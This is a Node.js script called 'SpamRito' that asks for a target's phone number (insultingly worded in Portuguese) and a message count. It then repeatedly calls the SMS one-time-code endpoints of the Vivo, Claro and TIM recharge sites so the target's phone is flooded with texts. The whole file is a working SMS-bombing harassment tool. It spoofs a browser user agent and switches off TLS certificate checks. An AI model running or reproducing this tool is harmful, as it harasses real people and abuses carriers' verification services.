var request = require('request');
const readLine = require('readline-sync');
const spam = {}
const status = {}
const color = {}

console.log({name: "SpamRito", version: "1.0", created: "08/08/2020", author: "KiritoOfficial"});

const kiritoOfficial = async (uri, postdata, headers = {}, method, proxy = false, jar) => {

    let resolve;
    let reject;
    const promise = new Promise((a, b) => {
        resolve = a;
        reject = b;
    });

    var h = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'upgrade-insecure-requests': '1'
    };

    if (postdata) {
        h['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    }
    try {
        JSON.parse(postdata);
        h['Content-Type'] = 'application/json; charset=UTF-8';
    } catch (ex) {

    }

    Object.keys(headers).forEach((value) => {
        h[value] = headers[value];
    });

    var opts = {
        method: method,
        url: uri,
        headers: h,
        body: postdata,
        followAllRedirects: true,
        jar: jar
    }

    opts["rejectUnauthorized"] = false;

    if (proxy) {
        opts["rejectUnauthorized"] = false;
        // opts.proxy = '';
    }

    request(opts, function (err, res, body) {
        if (err) {
            console.error(err);
            reject(err);
        } else {
            resolve(res);
        }
    });

    return promise;
}

color.fail = '\u001b[31m';
color.success = '\033[1;32m';
color.yellow = '\033[1;33m';
color.cyan = '\033[0;36m';
color.white = '\033[1;37m';
color.reset = '\u001b[0m';

function phone() {
	return readLine.question(color.cyan+'Coloca o numero do fudido: '+color.white);
}
function quantidade() {
	return readLine.question(color.cyan+'Quantos SMS quer enviar: '+color.yellow);
}

spam.phone = phone();
spam.qnt = quantidade();


const sms = async (phone) => {
	
	var vivo = await kiritoOfficial('https://recarga-api.vivo.com.br/sms-tokens/', `{"msisdn":"${phone}"}`, {
		'Host': 'recarga-api.vivo.com.br',
	    'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://www.recarga.vivo.com.br/recarga/consultar-saldo'
        }, 'POST').then((res) => {
        	status.vivo = res.statusCode;
            return res.statusCode;
    })
    
    var claro = await kiritoOfficial('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${phone}","target":"token","origin":"login"}`, {
		'Host': 'claro-recarga-api.m4u.com.br',
	    'Connection': 'keep-alive',
	    'Channel': 'CLARO_WEB_DESKTOP',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
        }, 'POST').then((res) => {
        	status.claro = res.statusCode;
            return res.statusCode;
    })
    
    var tim = await kiritoOfficial('https://tim-recarga-api.m4u.com.br/sms-token', `{"msisdn":"${phone}"}`, {
		'Host': 'tim-recarga-api.m4u.com.br',
	    'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://www.recarga.vivo.com.br/recarga/consultar-saldo'
        }, 'POST').then((res) => {
        	status.tim = res.statusCode;
            return res.statusCode;
    })
    if (vivo == 204 && claro == 204 && tim == 204) {
    	console.log(color.success+`[ + ] ${spam.phone} >> SMS enviado.`+color.reset)
    } else {
    	console.log(color.fail+`[ ! ] ${spam.phone} >> SMS falhou.`+color.reset)
    }
}

const startspam = async (quant) => {
	for (let i=0; i < quant; i++) {
		var msg = await sms(spam.phone);
	}
}

startspam(spam.qnt)